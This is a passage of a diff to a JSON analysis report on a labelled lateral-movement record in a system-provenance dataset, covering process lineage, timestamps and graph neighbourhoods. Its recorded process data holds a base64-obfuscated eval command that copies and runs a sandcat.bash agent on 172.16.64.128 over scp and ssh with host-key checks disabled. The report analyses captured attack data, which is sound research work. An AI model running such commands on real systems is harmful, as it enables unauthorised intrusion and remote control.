@@ -1,381 +1,85 @@
 {
-  "report_version": 1,
-  "selection": {
-    "attack_index_zero_based": 44,
-    "reason": "Selected because it is the dataset's only explicit lateral-movement record and its command and PID lineage contain scp/ssh remote-access steps."
+  "format_version": 2,
+  "attack": {
+    "index_zero_based": 44,
+    "metadata": {
+      "Time of Attack": "1701623585.0",
+      "Tactic Name": "lateral movement",
+      "Technique Name": "start sandcat",
+      "PID": "152566",
+      "readable_time": "2023-12-03 13:13:05"
+    }
   },
-  "attack_metadata": {
-    "Time of Attack": "1701623585.0",
-    "Tactic Name": "lateral movement",
-    "Technique Name": "start sandcat",
-    "PID": "152566",
-    "readable_time": "2023-12-03 13:13:05"
-  },
-  "attack_time": {
-    "epoch": 1701623585.0,
-    "utc": "2023-12-03T17:13:05+00:00"
-  },
-  "matching_processes": {
+  "anchor_process": {
     "pid": 152566,
-    "node_count": 2,
-    "ppids": [
-      4127
+    "node_ids": [
+      "86fe64bef7cfc5d236b26b3c6adcf04f",
+      "82fd22d6b1a5094a8d89584a450cd646"
     ],
-    "timestamps": [
-      1701626485.151
-    ],
-    "nodes": [
-      {
-        "id": "86fe64bef7cfc5d236b26b3c6adcf04f",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/dash",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "sh",
-        "pid": "152566.0",
-        "seen time": "1701626485.151",
-        "source": "syscall",
-        "ppid": "4127.0",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137769",
-        "entity_time": 1701626485.151,
-        "entity_time_utc": "2023-12-03T18:01:25.151000+00:00",
-        "derived_decoded_payload": null
-      },
-      {
-        "id": "82fd22d6b1a5094a8d89584a450cd646",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/dash",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "sh",
-        "pid": "152566.0",
-        "source": "syscall",
-        "ppid": "4127.0",
-        "command line": "sh -c eval \"$(echo c2NwIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgc2FuZGNhdC5iYXNoICBlcmZhbjJAMTcyLjE2LjY0LjEyODp+L0Rlc2t0b3A7IHNzaCAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW8gVXNlcktub3duSG9zdHNGaWxlPS9kZXYvbnVsbCAtbyBDb25uZWN0VGltZW91dD0zIGVyZmFuMkAxNzIuMTYuNjQuMTI4ICdub2h1cCBjaG1vZCB1K3ggLi9EZXNrdG9wL3NhbmRjYXQuYmFzaCc7c3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgZXJmYW4yQDE3Mi4xNi42NC4xMjggJ25vaHVwIC4vRGVza3RvcC9zYW5kY2F0LmJhc2gn | base64 --decode)\"",
-        "start time": "1701626485.151",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137770",
-        "entity_time": 1701626485.151,
-        "entity_time_utc": "2023-12-03T18:01:25.151000+00:00",
-        "derived_decoded_payload": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.bash  erfan2@172.16.64.128:~/Desktop; ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 'nohup chmod u+x ./Desktop/sandcat.bash';ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 'nohup ./Desktop/sandcat.bash'"
-      }
-    ]
+    "metadata_time": 1701623585.0,
+    "metadata_time_utc": "2023-12-03T17:13:05+00:00",
+    "provenance_time": 1701626485.151,
+    "provenance_time_utc": "2023-12-03T18:01:25.151000+00:00",
+    "provenance_minus_metadata_seconds": 2900.151000022888
   },
-  "timestamp_discrepancy": {
-    "closest_provenance_process_time": 1701626485.151,
-    "closest_provenance_process_time_utc": "2023-12-03T18:01:25.151000+00:00",
-    "provenance_minus_attack_seconds": 2900.151000022888,
-    "all_matching_process_deltas_seconds": [
-      2900.151000022888,
-      2900.151000022888
+  "inferred_process_lineage": {
+    "rule": "Follow nearby Process.ppid -> Process.pid to depth 3 within 300 seconds.",
+    "selected_pids": [
+      152566,
+      152570,
+      152571,
+      152598,
+      152612
     ],
-    "readable_time_minus_epoch_utc_seconds_when_both_are_treated_as_naive": -14400.0,
-    "observed_conclusion": "The metadata timestamp is not the execution timestamp for this PID.",
-    "unresolved": "The intended meaning/timezone of attack_info timestamps is not documented."
-  },
-  "process_lineage": {
-    "method": "Exact integer PID match for the root, then Process.ppid -> Process.pid within [1701626484.151, 1701626785.151] to depth 3.",
-    "parent_processes": [
-      {
-        "pid": 4127,
-        "node_count": 0,
-        "ppids": [],
-        "timestamps": [],
-        "nodes": [],
-        "resolution": "PID referenced by ppid but no Process node exists"
-      }
-    ],
-    "child_processes": [
-      {
-        "depth": 1,
-        "pid": 152570,
-        "node_count": 2,
-        "ppids": [
-          152566
-        ],
-        "timestamps": [
-          1701626485.159
-        ],
-        "nodes": [
-          {
-            "id": "09f2c865255e0dd3da2f3e33c955e94f",
-            "type": "Process",
-            "uid": "1000.0",
-            "egid": "1000.0",
-            "exe": "/usr/bin/scp",
-            "gid": "1000.0",
-            "euid": "1000.0",
-            "name": "scp",
-            "pid": "152570.0",
-            "seen time": "1701626485.159",
-            "source": "syscall",
-            "ppid": "152566.0",
-            "label": "1",
-            "subLabel": "lateralMovement",
-            "csv_line": "137779",
-            "entity_time": 1701626485.159,
-            "entity_time_utc": "2023-12-03T18:01:25.159000+00:00",
-            "derived_decoded_payload": null
-          },
-          {
-            "id": "edada763eb8341869cc2482b34fc7705",
-            "type": "Process",
-            "uid": "1000.0",
-            "egid": "1000.0",
-            "exe": "/usr/bin/scp",
-            "gid": "1000.0",
-            "euid": "1000.0",
-            "name": "scp",
-            "pid": "152570.0",
-            "source": "syscall",
-            "ppid": "152566.0",
-            "command line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.bash erfan2@172.16.64.128:~/Desktop",
-            "start time": "1701626485.159",
-            "label": "1",
-            "subLabel": "lateralMovement",
-            "csv_line": "137780",
-            "entity_time": 1701626485.159,
-            "entity_time_utc": "2023-12-03T18:01:25.159000+00:00",
-            "derived_decoded_payload": null
-          }
-        ]
-      },
-      {
-        "depth": 1,
-        "pid": 152598,
-        "node_count": 2,
-        "ppids": [
-          152566
-        ],
-        "timestamps": [
-          1701626511.882
-        ],
-        "nodes": [
-          {
-            "id": "86e9c9bf7f6b786bf03eb30b58c10b5c",
-            "type": "Process",
-            "uid": "1000.0",
-            "egid": "1000.0",
-            "exe": "/usr/bin/ssh",
-            "gid": "1000.0",
-            "euid": "1000.0",
-            "name": "ssh",
-            "pid": "152598.0",
-            "seen time": "1701626511.882",
-            "source": "syscall",
-            "ppid": "152566.0",
-            "label": "1",
-            "subLabel": "lateralMovement",
-            "csv_line": "137810",
-            "entity_time": 1701626511.882,
-            "entity_time_utc": "2023-12-03T18:01:51.882000+00:00",
-            "derived_decoded_payload": null
-          },
-          {
-            "id": "a26390a44a4e9717c930e77d300e2cd5",
-            "type": "Process",
-            "uid": "1000.0",
-            "egid": "1000.0",
-            "exe": "/usr/bin/ssh",
-            "gid": "1000.0",
-            "euid": "1000.0",
-            "name": "ssh",
-            "pid": "152598.0",
-            "source": "syscall",
-            "ppid": "152566.0",
-            "command line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 nohup chmod u+x ./Desktop/sandcat.bash",
-            "start time": "1701626511.882",
-            "label": "1",
-            "subLabel": "lateralMovement",
-            "csv_line": "137811",
-            "entity_time": 1701626511.882,
-            "entity_time_utc": "2023-12-03T18:01:51.882000+00:00",
-            "derived_decoded_payload": null
-          }
-        ]
-      },
-      {
-        "depth": 1,
-        "pid": 152612,
-        "node_count": 2,
-        "ppids": [
-          152566
-        ],
-        "timestamps": [
-          1701626525.453
-        ],
-        "nodes": [
-          {
-            "id": "2766fab1d748b6da6e8f33ca40a3c29f",
-            "type": "Process",
-            "uid": "1000.0",
-            "egid": "1000.0",
-            "exe": "/usr/bin/ssh",
-            "gid": "1000.0",
-            "euid": "1000.0",
-            "name": "ssh",
-            "pid": "152612.0",
-            "seen time": "1701626525.453",
-            "source": "syscall",
-            "ppid": "152566.0",
-            "label": "1",
-            "subLabel": "lateralMovement",
-            "csv_line": "137818",
-            "entity_time": 1701626525.453,
-            "entity_time_utc": "2023-12-03T18:02:05.453000+00:00",
-            "derived_decoded_payload": null
-          },
-          {
-            "id": "a08d65887c2473ce28c243387d8ab3b7",
-            "type": "Process",
-            "uid": "1000.0",
-            "egid": "1000.0",
-            "exe": "/usr/bin/ssh",
-            "gid": "1000.0",
-            "euid": "1000.0",
-            "name": "ssh",
-            "pid": "152612.0",
-            "source": "syscall",
-            "ppid": "152566.0",
-            "command line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 nohup ./Desktop/sandcat.bash",
-            "start time": "1701626525.453",
-            "label": "1",
-            "subLabel": "lateralMovement",
-            "csv_line": "137819",
-            "entity_time": 1701626525.453,
-            "entity_time_utc": "2023-12-03T18:02:05.453000+00:00",
-            "derived_decoded_payload": null
-          }
-        ]
-      },
-      {
-        "depth": 2,
-        "pid": 152571,
-        "node_count": 2,
-        "ppids": [
-          152570
-        ],
-        "timestamps": [
-          1701626485.167
-        ],
-        "nodes": [
-          {
-            "id": "e5f46056ef074525f6e1febcd05bd6bd",
-            "type": "Process",
-            "uid": "1000.0",
-            "egid": "1000.0",
-            "exe": "/usr/bin/ssh",
-            "gid": "1000.0",
-            "euid": "1000.0",
-            "name": "ssh",
-            "pid": "152571.0",
-            "seen time": "1701626485.167",
-            "source": "syscall",
-            "ppid": "152570.0",
-            "label": "1",
-            "subLabel": "lateralMovement",
-            "csv_line": "137785",
-            "entity_time": 1701626485.167,
-            "entity_time_utc": "2023-12-03T18:01:25.167000+00:00",
-            "derived_decoded_payload": null
-          },
-          {
-            "id": "59fd9481258102acb3b649cdc7cd7a11",
-            "type": "Process",
-            "uid": "1000.0",
-            "egid": "1000.0",
-            "exe": "/usr/bin/ssh",
-            "gid": "1000.0",
-            "euid": "1000.0",
-            "name": "ssh",
-            "pid": "152571.0",
-            "source": "syscall",
-            "ppid": "152570.0",
-            "command line": "/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 -l erfan2 -- 172.16.64.128 scp -t ~/Desktop",
-            "start time": "1701626485.167",
-            "label": "1",
-            "subLabel": "lateralMovement",
-            "csv_line": "137786",
-            "entity_time": 1701626485.167,
-            "entity_time_utc": "2023-12-03T18:01:25.167000+00:00",
-            "derived_decoded_payload": null
-          }
-        ]
-      }
-    ],
-    "pid_relations": [
+    "relationships": [
       {
         "parent_pid": 152566,
         "child_pid": 152570,
         "depth": 1,
-        "evidence": "Process.ppid equals another selected Process.pid",
-        "relationship_kind": "inferred_pid_lineage"
-      },
-      {
-        "parent_pid": 152566,
-        "child_pid": 152612,
-        "depth": 1,
-        "evidence": "Process.ppid equals another selected Process.pid",
-        "relationship_kind": "inferred_pid_lineage"
+        "kind": "inferred_pid_lineage",
+        "evidence": "child Process.ppid equals parent Process.pid"
       },
       {
         "parent_pid": 152566,
         "child_pid": 152598,
         "depth": 1,
-        "evidence": "Process.ppid equals another selected Process.pid",
-        "relationship_kind": "inferred_pid_lineage"
+        "kind": "inferred_pid_lineage",
+        "evidence": "child Process.ppid equals parent Process.pid"
+      },
+      {
+        "parent_pid": 152566,
+        "child_pid": 152612,
+        "depth": 1,
+        "kind": "inferred_pid_lineage",
+        "evidence": "child Process.ppid equals parent Process.pid"
       },
       {
         "parent_pid": 152570,
         "child_pid": 152571,
         "depth": 2,
-        "evidence": "Process.ppid equals another selected Process.pid",
-        "relationship_kind": "inferred_pid_lineage"
+        "kind": "inferred_pid_lineage",
+        "evidence": "child Process.ppid equals parent Process.pid"
       }
     ]
   },
-  "process_identity_investigation": {
-    "unique_process_pids": 12443,
-    "process_node_count": 24839,
-    "nodes_per_pid_counts": {
-      "1": 260,
-      "2": 12059,
-      "3": 80,
-      "4": 9,
-      "5": 25,
-      "6": 10
-    },
-    "two_node_pid_groups": 12059,
-    "two_node_groups_with_same_timestamp": 12029,
-    "two_node_groups_with_one_seen_and_one_start_time": 12056,
-    "two_node_groups_with_same_core_attributes": 11904,
-    "was_triggered_by_same_pid_edges": 13136,
-    "was_triggered_by_different_pid_edges": 0,
-    "interpretation": "The same-PID WasTriggeredBy pattern, complementary timestamps, and state-changing operations support interpreting multiple IDs as process-state/execution-version entities rather than ordinary OS parent/child processes. The exact producer semantics remain undocumented."
-  },
-  "local_neighborhood": {
-    "scope": "all provenance edges incident to root or selected PID/PPID-descendant Process IDs",
+  "incident_graph": {
+    "scope": "selected Process nodes and their directly adjacent observed relationships",
     "node_count": 14,
-    "process_node_count": 10,
-    "artifact_node_count": 4,
-    "edge_count": 15,
-    "relationship_operation_counts": {
-      "Used:load": 10,
-      "WasTriggeredBy:execve": 5
-    },
-    "stored_direction_counts": {
-      "edges_outgoing_from_lineage_nodes": 15,
-      "edges_incoming_to_lineage_nodes": 5,
-      "note": "An edge between two lineage nodes contributes to both counts; these are stored from/to directions, not inferred causal or OS-parent directions."
-    },
-    "process_nodes": [
+    "observed_relationship_count": 15,
+    "nodes": [
+      {
+        "id": "02a4195a9866b7c9eba7405c13110dad",
+        "type": "Artifact",
+        "source": "syscall",
+        "path": "/lib64/ld-linux-x86-64.so.2",
+        "subtype": "file",
+        "permissions": "755.0",
+        "epoch": "0.0",
+        "version": "0.0",
+        "label": "0",
+        "subLabel": "0",
+        "csv_line": "9"
+      },
       {
         "id": "09f2c865255e0dd3da2f3e33c955e94f",
         "type": "Process",
@@ -391,7 +95,9 @@
         "ppid": "152566.0",
         "label": "1",
         "subLabel": "lateralMovement",
-        "csv_line": "137779"
+        "csv_line": "137779",
+        "entity_time": 1701626485.159,
+        "entity_time_utc": "2023-12-03T18:01:25.159000+00:00"
       },
       {
         "id": "2766fab1d748b6da6e8f33ca40a3c29f",
@@ -408,7 +114,9 @@
         "ppid": "152566.0",
         "label": "1",
         "subLabel": "lateralMovement",
-        "csv_line": "137818"
+        "csv_line": "137818",
+        "entity_time": 1701626525.453,
+        "entity_time_utc": "2023-12-03T18:02:05.453000+00:00"
       },
       {
         "id": "59fd9481258102acb3b649cdc7cd7a11",
@@ -426,145 +134,9 @@
         "start time": "1701626485.167",
         "label": "1",
         "subLabel": "lateralMovement",
-        "csv_line": "137786"
-      },
-      {
-        "id": "82fd22d6b1a5094a8d89584a450cd646",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/dash",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "sh",
-        "pid": "152566.0",
-        "source": "syscall",
-        "ppid": "4127.0",
-        "command line": "sh -c eval \"$(echo c2NwIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgc2FuZGNhdC5iYXNoICBlcmZhbjJAMTcyLjE2LjY0LjEyODp+L0Rlc2t0b3A7IHNzaCAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW8gVXNlcktub3duSG9zdHNGaWxlPS9kZXYvbnVsbCAtbyBDb25uZWN0VGltZW91dD0zIGVyZmFuMkAxNzIuMTYuNjQuMTI4ICdub2h1cCBjaG1vZCB1K3ggLi9EZXNrdG9wL3NhbmRjYXQuYmFzaCc7c3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgZXJmYW4yQDE3Mi4xNi42NC4xMjggJ25vaHVwIC4vRGVza3RvcC9zYW5kY2F0LmJhc2gn | base64 --decode)\"",
-        "start time": "1701626485.151",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137770"
-      },
-      {
-        "id": "86e9c9bf7f6b786bf03eb30b58c10b5c",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/ssh",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "ssh",
-        "pid": "152598.0",
-        "seen time": "1701626511.882",
-        "source": "syscall",
-        "ppid": "152566.0",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137810"
-      },
-      {
-        "id": "86fe64bef7cfc5d236b26b3c6adcf04f",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/dash",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "sh",
-        "pid": "152566.0",
-        "seen time": "1701626485.151",
-        "source": "syscall",
-        "ppid": "4127.0",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137769"
-      },
-      {
-        "id": "a08d65887c2473ce28c243387d8ab3b7",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/ssh",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "ssh",
-        "pid": "152612.0",
-        "source": "syscall",
-        "ppid": "152566.0",
-        "command line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 nohup ./Desktop/sandcat.bash",
-        "start time": "1701626525.453",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137819"
-      },
-      {
-        "id": "a26390a44a4e9717c930e77d300e2cd5",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/ssh",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "ssh",
-        "pid": "152598.0",
-        "source": "syscall",
-        "ppid": "152566.0",
-        "command line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 nohup chmod u+x ./Desktop/sandcat.bash",
-        "start time": "1701626511.882",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137811"
-      },
-      {
-        "id": "e5f46056ef074525f6e1febcd05bd6bd",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/ssh",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "ssh",
-        "pid": "152571.0",
-        "seen time": "1701626485.167",
-        "source": "syscall",
-        "ppid": "152570.0",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137785"
-      },
-      {
-        "id": "edada763eb8341869cc2482b34fc7705",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/scp",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "scp",
-        "pid": "152570.0",
-        "source": "syscall",
-        "ppid": "152566.0",
-        "command line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.bash erfan2@172.16.64.128:~/Desktop",
-        "start time": "1701626485.159",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137780"
-      }
-    ],
-    "files_or_artifacts_used": [
-      {
-        "id": "02a4195a9866b7c9eba7405c13110dad",
-        "type": "Artifact",
-        "source": "syscall",
-        "path": "/lib64/ld-linux-x86-64.so.2",
-        "subtype": "file",
-        "permissions": "755.0",
-        "epoch": "0.0",
-        "version": "0.0",
-        "label": "0",
-        "subLabel": "0",
-        "csv_line": "9"
+        "csv_line": "137786",
+        "entity_time": 1701626485.167,
+        "entity_time_utc": "2023-12-03T18:01:25.167000+00:00"
       },
       {
         "id": "5b5b71f1a2252e659e04568f2eb536f2",
@@ -604,62 +176,6 @@
         "label": "0",
         "subLabel": "0",
         "csv_line": "137782"
-      }
-    ],
-    "artifacts_generated": [],
-    "network_artifacts": [],
-    "labeled_nodes": [
-      {
-        "id": "09f2c865255e0dd3da2f3e33c955e94f",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/scp",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "scp",
-        "pid": "152570.0",
-        "seen time": "1701626485.159",
-        "source": "syscall",
-        "ppid": "152566.0",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137779"
-      },
-      {
-        "id": "2766fab1d748b6da6e8f33ca40a3c29f",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/ssh",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "ssh",
-        "pid": "152612.0",
-        "seen time": "1701626525.453",
-        "source": "syscall",
-        "ppid": "152566.0",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137818"
-      },
-      {
-        "id": "59fd9481258102acb3b649cdc7cd7a11",
-        "type": "Process",
-        "uid": "1000.0",
-        "egid": "1000.0",
-        "exe": "/usr/bin/ssh",
-        "gid": "1000.0",
-        "euid": "1000.0",
-        "name": "ssh",
-        "pid": "152571.0",
-        "source": "syscall",
-        "ppid": "152570.0",
-        "command line": "/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 -l erfan2 -- 172.16.64.128 scp -t ~/Desktop",
-        "start time": "1701626485.167",
-        "label": "1",
-        "subLabel": "lateralMovement",
-        "csv_line": "137786"
       },
       {
         "id": "82fd22d6b1a5094a8d89584a450cd646",
@@ -677,7 +193,10 @@
         "start time": "1701626485.151",
         "label": "1",
         "subLabel": "lateralMovement",
-        "csv_line": "137770"
+        "csv_line": "137770",
+        "entity_time": 1701626485.151,
+        "entity_time_utc": "2023-12-03T18:01:25.151000+00:00",
+        "derived_decoded_command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.bash  erfan2@172.16.64.128:~/Desktop; ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 'nohup chmod u+x ./Desktop/sandcat.bash';ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 'nohup ./Desktop/sandcat.bash'"
       },
       {
         "id": "86e9c9bf7f6b786bf03eb30b58c10b5c",
@@ -694,7 +213,9 @@
         "ppid": "152566.0",
         "label": "1",
         "subLabel": "lateralMovement",
-        "csv_line": "137810"
+        "csv_line": "137810",
+        "entity_time": 1701626511.882,
+        "entity_time_utc": "2023-12-03T18:01:51.882000+00:00"
       },
       {
         "id": "86fe64bef7cfc5d236b26b3c6adcf04f",
@@ -711,7 +232,9 @@
         "ppid": "4127.0",
         "label": "1",
         "subLabel": "lateralMovement",
-        "csv_line": "137769"
+        "csv_line": "137769",
+        "entity_time": 1701626485.151,
+        "entity_time_utc": "2023-12-03T18:01:25.151000+00:00"
       },
       {
         "id": "a08d65887c2473ce28c243387d8ab3b7",
@@ -729,7 +252,9 @@
         "start time": "1701626525.453",
         "label": "1",
         "subLabel": "lateralMovement",
-        "csv_line": "137819"
+        "csv_line": "137819",
+        "entity_time": 1701626525.453,
+        "entity_time_utc": "2023-12-03T18:02:05.453000+00:00"
       },
       {
         "id": "a26390a44a4e9717c930e77d300e2cd5",
@@ -747,7 +272,9 @@
         "start time": "1701626511.882",
         "label": "1",
         "subLabel": "lateralMovement",
-        "csv_line": "137811"
+        "csv_line": "137811",
+        "entity_time": 1701626511.882,
+        "entity_time_utc": "2023-12-03T18:01:51.882000+00:00"
       },
       {
         "id": "e5f46056ef074525f6e1febcd05bd6bd",
@@ -764,7 +291,9 @@
         "ppid": "152570.0",
         "label": "1",
         "subLabel": "lateralMovement",
-        "csv_line": "137785"
+        "csv_line": "137785",
+        "entity_time": 1701626485.167,
+        "entity_time_utc": "2023-12-03T18:01:25.167000+00:00"
       },
       {
         "id": "edada763eb8341869cc2482b34fc7705",
@@ -782,11 +311,12 @@
         "start time": "1701626485.159",
         "label": "1",
         "subLabel": "lateralMovement",
-        "csv_line": "137780"
+        "csv_line": "137780",
+        "entity_time": 1701626485.159,
+        "entity_time_utc": "2023-12-03T18:01:25.159000+00:00"
       }
     ],
-    "labeled_edges": [],
-    "provenance_edges": [
+    "observed_relationships": [
       {
         "type": "WasTriggeredBy",
         "from": "82fd22d6b1a5094a8d89584a450cd646",
@@ -969,241 +499,9 @@
       }
     ]
   },
-  "unconstrained_graph_traversal": {
-    "anchor_node_count": 2,
-    "one_hop_node_count": 4,
-    "two_hop_node_count": 12225,
-    "two_hop_incident_edge_count": 12283,
-    "observed_conclusion": "Shared executable/loader Artifact IDs act as hubs, so unconstrained hop traversal quickly mixes unrelated activity from across the capture."
-  },
-  "candidate_temporal_windows": [
-    {
-      "name": "metadata_plus_minus_60s",
-      "center_kind": "metadata",
-      "start": 1701623525.0,
-      "end": 1701623645.0,
-      "start_utc": "2023-12-03T17:12:05+00:00",
-      "end_utc": "2023-12-03T17:14:05+00:00",
-      "edge_count": 68,
-      "labeled_edge_count": 0,
-      "lineage_edge_count": 0,
-      "duration_seconds": 120.0,
-      "node_count": 40,
-      "labeled_node_count": 11,
-      "labeled_node_sublabel_counts": {
-        "discovery": 11
-      },
-      "network_artifact_count": 19,
-      "lineage_edge_total": 15,
-      "lineage_edge_coverage": 0.0
-    },
-    {
-      "name": "metadata_plus_minus_300s",
-      "center_kind": "metadata",
-      "start": 1701623285.0,
-      "end": 1701623885.0,
-      "start_utc": "2023-12-03T17:08:05+00:00",
-      "end_utc": "2023-12-03T17:18:05+00:00",
-      "edge_count": 264,
-      "labeled_edge_count": 0,
-      "lineage_edge_count": 0,
-      "duration_seconds": 600.0,
-      "node_count": 88,
-      "labeled_node_count": 11,
-      "labeled_node_sublabel_counts": {
-        "discovery": 11
-      },
-      "network_artifact_count": 30,
-      "lineage_edge_total": 15,
-      "lineage_edge_coverage": 0.0
-    },
-    {
-      "name": "metadata_plus_minus_900s",
-      "center_kind": "metadata",
-      "start": 1701622685.0,
-      "end": 1701624485.0,
-      "start_utc": "2023-12-03T16:58:05+00:00",
-      "end_utc": "2023-12-03T17:28:05+00:00",
-      "edge_count": 766,
-      "labeled_edge_count": 0,
-      "lineage_edge_count": 0,
-      "duration_seconds": 1800.0,
-      "node_count": 218,
-      "labeled_node_count": 11,
-      "labeled_node_sublabel_counts": {
-        "discovery": 11
-      },
-      "network_artifact_count": 74,
-      "lineage_edge_total": 15,
-      "lineage_edge_coverage": 0.0
-    },
-    {
-      "name": "metadata_plus_minus_3600s",
-      "center_kind": "metadata",
-      "start": 1701619985.0,
-      "end": 1701627185.0,
-      "start_utc": "2023-12-03T16:13:05+00:00",
-      "end_utc": "2023-12-03T18:13:05+00:00",
-      "edge_count": 3034,
-      "labeled_edge_count": 0,
-      "lineage_edge_count": 15,
-      "duration_seconds": 7200.0,
-      "node_count": 841,
-      "labeled_node_count": 23,
-      "labeled_node_sublabel_counts": {
-        "lateralMovement": 10,
-        "discovery": 11,
-        "credentialAccess": 2
-      },
-      "network_artifact_count": 288,
-      "lineage_edge_total": 15,
-      "lineage_edge_coverage": 1.0
-    },
-    {
-      "name": "provenance_process_plus_minus_60s",
-      "center_kind": "provenance_process",
-      "start": 1701626425.151,
-      "end": 1701626545.151,
-      "start_utc": "2023-12-03T18:00:25.151000+00:00",
-      "end_utc": "2023-12-03T18:02:25.151000+00:00",
-      "edge_count": 75,
-      "labeled_edge_count": 0,
-      "lineage_edge_count": 15,
-      "duration_seconds": 120.0,
-      "node_count": 41,
-      "labeled_node_count": 10,
-      "labeled_node_sublabel_counts": {
-        "lateralMovement": 10
-      },
-      "network_artifact_count": 11,
-      "lineage_edge_total": 15,
-      "lineage_edge_coverage": 1.0
-    },
-    {
-      "name": "provenance_process_plus_minus_300s",
-      "center_kind": "provenance_process",
-      "start": 1701626185.151,
-      "end": 1701626785.151,
-      "start_utc": "2023-12-03T17:56:25.151000+00:00",
-      "end_utc": "2023-12-03T18:06:25.151000+00:00",
-      "edge_count": 260,
-      "labeled_edge_count": 0,
-      "lineage_edge_count": 15,
-      "duration_seconds": 600.0,
-      "node_count": 87,
-      "labeled_node_count": 10,
-      "labeled_node_sublabel_counts": {
-        "lateralMovement": 10
-      },
-      "network_artifact_count": 22,
-      "lineage_edge_total": 15,
-      "lineage_edge_coverage": 1.0
-    },
-    {
-      "name": "provenance_process_plus_minus_900s",
-      "center_kind": "provenance_process",
-      "start": 1701625585.151,
-      "end": 1701627385.151,
-      "start_utc": "2023-12-03T17:46:25.151000+00:00",
-      "end_utc": "2023-12-03T18:16:25.151000+00:00",
-      "edge_count": 761,
-      "labeled_edge_count": 0,
-      "lineage_edge_count": 15,
-      "duration_seconds": 1800.0,
-      "node_count": 226,
-      "labeled_node_count": 10,
-      "labeled_node_sublabel_counts": {
-        "lateralMovement": 10
-      },
-      "network_artifact_count": 76,
